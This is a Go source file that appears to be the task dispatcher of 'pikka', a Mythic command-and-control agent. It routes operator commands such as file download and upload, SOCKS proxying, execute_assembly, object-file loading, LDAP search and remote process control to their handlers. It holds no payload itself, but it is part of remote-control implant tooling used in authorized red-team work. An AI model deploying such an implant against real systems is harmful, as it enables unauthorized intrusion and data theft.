package tasks

import (
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/cat"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/objload"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/download"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/download_bulk"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/execute_assembly"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/exit"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/kill"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/ldapsearch"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/ls"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/run"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/sleep"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/socks"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/tsconnect"
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/upload"
)

var newTaskChannel = make(chan structs.Task, 10)

// listenForNewTask uses NewTaskChannel to spawn goroutine based on task's Run method
func listenForNewTask() {
	for {
		task := <-newTaskChannel
		switch task.Command {
		case "exit":
			go exit.Run(task)
		case "download":
			go download.Run(task)
		case "sleep":
			go sleep.Run(task)
		case "cat":
			go cat.Run(task)
		case "ls":
			go ls.Run(task)
		case "kill":
			go kill.Run(task)
		case "upload":
			go upload.Run(task)
		case "socks":
			go socks.Run(task)
		case "run":
			go run.Run(task)
		case "download_bulk":
			go download_bulk.Run(task)
		case "execute_assembly":
			go execute_assembly.Run(task)
		case "ldapsearch":
			go ldapsearch.Run(task)
		case "tsconnect":
			go tsconnect.Run(task)
		case "objload":
			go objload.Run(task)
		default:
			// No tasks, do nothing
		}
	}
}
